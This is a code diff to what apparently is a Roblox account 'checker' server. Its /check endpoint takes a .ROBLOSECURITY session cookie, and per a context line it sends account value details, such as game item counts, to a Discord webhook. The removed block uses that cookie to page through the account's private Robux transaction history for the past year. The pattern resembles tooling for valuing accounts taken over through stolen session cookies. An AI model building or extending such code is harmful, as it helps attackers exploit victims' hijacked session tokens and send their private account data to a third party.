@@ -105,8 +105,6 @@ async function check() {
       <b>AMP:</b> \${json.ampCount || 0}<br>
       <b>SAB:</b> \${json.sabCount || 0}<br>
       <b>JB:</b> \${json.jbCount || 0}<br>
-      <b>Incoming Robux (last 12 months):</b> \${json.incomingRobux?.toLocaleString('en-US') || 0} <small>(stipends, sales, payouts, trades)</small><br>
-      <b>Outgoing Robux (last 12 months):</b> \${json.outgoingRobux?.toLocaleString('en-US') || 0} <small>(items, trades only – real money not included)</small><br>
     \`;
 
     result.innerHTML = html;
@@ -291,55 +289,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Incoming & Outgoing Robux in the last 12 months (visible in API only)
-    let incomingRobux = 0;
-    let outgoingRobux = 0;
-    let cursor = null;
-    const oneYearAgo = new Date();
-    oneYearAgo.setFullYear(oneYearAgo.getFullYear() - 1);
-
-    try {
-      do {
-        const url = `https://economy.roblox.com/v2/users/${userData.id}/transactions?limit=100` +
-                    (cursor ? `&cursor=${encodeURIComponent(cursor)}` : '');
-
-        const txRes = await fetch(url, {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json'
-          }
-        });
-
-        if (!txRes.ok) break;
-
-        const txData = await txRes.json();
-
-        if (txData.data && Array.isArray(txData.data)) {
-          let shouldBreak = false;
-          for (const tx of txData.data) {
-            const txDate = new Date(tx.created);
-            if (txDate < oneYearAgo) {
-              shouldBreak = true;
-              break;
-            }
-
-            const amount = tx.amountInRobux || 0;
-            if (amount > 0) {
-              incomingRobux += amount;
-            } else if (amount < 0) {
-              outgoingRobux += Math.abs(amount);
-            }
-          }
-          if (shouldBreak) break;
-        }
-
-        cursor = txData.nextPageCursor;
-      } while (cursor);
-    } catch (e) {
-      console.error('Transactions fetch error:', e.message);
-    }
-
     const result = {
       success: true,
       username: userData.name,
@@ -357,9 +306,7 @@ app.post('/check', async (req, res) => {
       mm2Count,
       ampCount,
       sabCount,
-      jbCount,
-      incomingRobux,
-      outgoingRobux
+      jbCount
     };
 
     // Send to Discord webhook (two embeds)
@@ -399,14 +346,6 @@ app.post('/check', async (req, res) => {
                       `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                       `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                       `<:JB:1481804052215103509> JB: **${jbCount}**`,
-                    inline: true
-                  },
-                  {
-                    name: "**Spending**",
-                    value: 
-                      `Incoming Robux (last 12 months): **${incomingRobux.toLocaleString('en-US')}**\n` +
-                      `Outgoing Robux (last 12 months): **${outgoingRobux.toLocaleString('en-US')}**\n` +
-                      `(items, trades, payouts only – real money buys not included)`,
                     inline: true
                   },
                   {
